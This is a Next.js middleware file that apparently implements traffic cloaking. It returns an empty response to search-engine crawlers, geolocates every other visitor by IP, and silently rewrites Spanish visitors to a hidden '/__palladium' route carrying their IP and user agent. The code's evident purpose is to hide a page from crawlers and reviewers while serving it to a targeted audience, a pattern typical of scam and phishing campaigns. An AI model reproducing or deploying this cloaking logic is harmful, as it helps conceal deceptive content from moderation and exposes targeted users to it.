import { NextRequest, NextResponse } from 'next/server'

function isBot(ua: string) {
    return /googlebot|bingbot|yandex|duckduckbot|baiduspider/i.test(ua)
}

export async function middleware(req: NextRequest) {
    const ua = req.headers.get('user-agent')?.toLowerCase() || ''
    if (isBot(ua)) return new NextResponse(null, { status: 204 })

    const ipHeader =
        req.headers.get('x-forwarded-for') ||
        req.headers.get('x-real-ip') ||
        req.headers.get('cf-connecting-ip') ||
        '8.8.8.8'
    const ip = ipHeader.split(',')[0].trim()

    try {
        const geoRes = await fetch(`https://ipwho.is/${ip}`)
        const geo = await geoRes.json()
        const isSpain = geo.success && geo.country_code === 'ES'

        if (!isSpain) return NextResponse.next()
    } catch {
        return NextResponse.next()
    }

    const url = req.nextUrl.clone()
    url.pathname = '/__palladium'
    url.searchParams.set('ip', ip)
    url.searchParams.set('ua', ua)

    return NextResponse.rewrite(url)
}

export const config = {
    matcher: ['/', '/((?!_next|api|static|favicon.ico|__palladium).*)'],
}
